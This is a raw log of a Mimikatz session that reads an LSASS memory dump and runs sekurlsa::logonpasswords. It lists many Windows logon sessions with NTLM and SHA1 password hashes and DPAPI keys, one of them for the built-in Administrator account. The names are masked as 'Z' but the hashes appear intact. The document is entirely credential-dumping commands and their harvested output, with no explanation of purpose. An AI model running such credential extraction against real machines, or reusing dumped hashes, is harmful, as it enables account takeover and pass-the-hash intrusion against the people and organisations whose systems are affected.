Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump /tmp/lsass.DMP
Switch to MINIDUMP : '/tmp/lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : '/tmp/lsass.DMP' file for minidump...

Authentication Id : 0 ; 406458 (00000000:000633ba)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 18:00:03
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
	 * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
	 * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 365835 (00000000:0005950b)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:59:38
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 365493 (00000000:000593b5)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:59:38
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 153705 (00000000:00025869)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:59:04
SID               : S-1-5-21-4194615774-2175524697-3563712290-500
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
	 * SHA1     : db5c89a961644f0978b4b69a4d2a2239d7886368
	 * DPAPI    : 240339f898b6ac4ce3f34702e4a89550
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 40310 (00000000:00009d76)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:46
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 40232 (00000000:00009d28)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:46
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:46
SID               : S-1-5-20
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 24410 (00000000:00005f5a)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:46
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 406499 (00000000:000633e3)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 18:00:03
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
	 * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
	 * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 366665 (00000000:00059849)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:59:38
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 366649 (00000000:00059839)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:59:38
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:47
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 24405 (00000000:00005f55)
Session           : Interactive from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:46
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 24294 (00000000:00005ee6)
Session           : Interactive from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:46
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 24282 (00000000:00005eda)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:46
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : Z
	ssp :	
	credman :	

Authentication Id : 0 ; 22028 (00000000:0000560c)
Session           : UndefinedLogonType from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:44
SID               : 
	msv :	
	 [00000003] Z
	 * Username : Z
	 * Domain   : Z
	 * NTLM     : b624dc83a27cc29da11d9bf25efea796
	 * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 23/02/2020 17:57:44
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	kerberos :	
	 * Username : Z
	 * Domain   : Z
	 * Password : (null)
	ssp :	
	credman :	

mimikatz # exit
Bye!
